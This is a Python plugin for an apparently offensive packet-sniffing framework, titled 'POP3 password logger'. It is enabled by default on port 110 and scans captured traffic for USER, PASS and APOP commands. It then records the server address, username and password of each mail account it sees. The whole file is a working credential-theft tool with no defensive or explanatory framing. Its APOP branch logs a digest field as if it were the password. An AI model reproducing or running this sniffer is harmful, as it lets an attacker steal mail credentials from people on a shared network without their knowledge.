"""POP3 password logger"""
PROPERTY={}
PROPERTY['NAME']="POP3 Logger"
PROPERTY['DESC']="This logs all the POP3 accounts"
PROPERTY['AUTHOR']='localh0t'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=110
PROPERTY['DPORT']=110
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')
        for line in lines:
            if(line[:4].lower() == "user"):
                user = line[5:]
            elif(line[:4].lower() == "pass"):
                passwd = line[5:]
            elif(line[:4].lower() == "apop"):
            	line = line.split(' ')
            	user, passwd = line[1], line[2]
        if (user != None and passwd != None):
                self.logger.addInfo('POP3',self.traffic.dst,user,passwd)
                user = None
                passwd = None
